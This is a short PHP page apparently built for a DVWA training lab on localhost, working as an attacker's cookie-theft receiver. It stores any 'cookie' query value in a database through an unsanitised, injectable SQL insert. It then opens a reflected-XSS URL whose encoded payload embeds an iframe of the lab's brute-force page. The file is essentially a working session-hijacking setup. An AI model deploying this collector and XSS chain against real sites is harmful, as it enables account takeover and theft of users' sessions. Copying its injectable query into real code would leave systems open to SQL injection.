<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">

<html>

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />

    <?php


    //server
    include "C:\\xampp\\htdocs\\3.dvwa\\0.db_info.php";

    $k=0;
    if( isset( $_GET[ 'cookie' ] ) ) {
        $cookie=$_GET[ 'cookie' ];
        $query = "insert into cookie (cookie) values ('$cookie');";

        $result = mysqli_query($con, $query) ;
        $k=1;
    }
    if($k==1) {
        echo "<script>window.open('http://localhost/3.dvwa/10.XSS%20(Reflected)/10-1.XSS%20(Reflected).php?name=%3Ciframe+width%3D600+height%3D400+src%3D%22http%3A%2F%2Flocalhost%2F3.dvwa%2F1.brutefource%2F0.get%2F1-1.bru-GET.php%22%3E%3C%2Fiframe%3E&user_token=f4fecd26ef98686cf4e21641e8340d88#');</script>";
    }
    ?>


</head>


<body class="home">
<div id="container">

    <div id="main_body">
        <form action="#" method="GET">
            <input type="hidden" name='cookie'>

        </form>



</body>

</html>



